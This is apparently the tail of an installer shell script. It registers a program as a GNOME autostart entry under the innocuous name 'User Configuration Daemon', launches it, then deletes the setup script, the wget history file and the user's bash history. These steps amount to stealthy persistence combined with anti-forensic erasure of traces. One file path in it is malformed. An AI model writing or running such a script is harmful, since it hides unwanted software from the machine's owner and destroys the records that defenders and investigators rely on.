rm ~/.config/autostart/userconfd.desktop

echo "[Desktop Entry]
Name=User Configuration Daemon
GenericName=userconfd
Exec=/path/to/my/script.sh
Terminal=false
Type=Application
X-GNOME-Autostart-enabled=true" >> ~/.config/autostart/userconfd.desktop

rm ~/.local/share/applications.userconf.desktop

echo "[Desktop Entry]
Type=Application
Name=User Configuration Daemon
Exec=~/.config/userconf/rundaemon
Icon=system-run
X-GNOME-Autostart-enabled=true" >> ~/.local/share/applications/userconf.desktop

gtk-launch userconfd.desktop

rm setup.sh

rm -f .wget-hsts
rm -f .bash_history
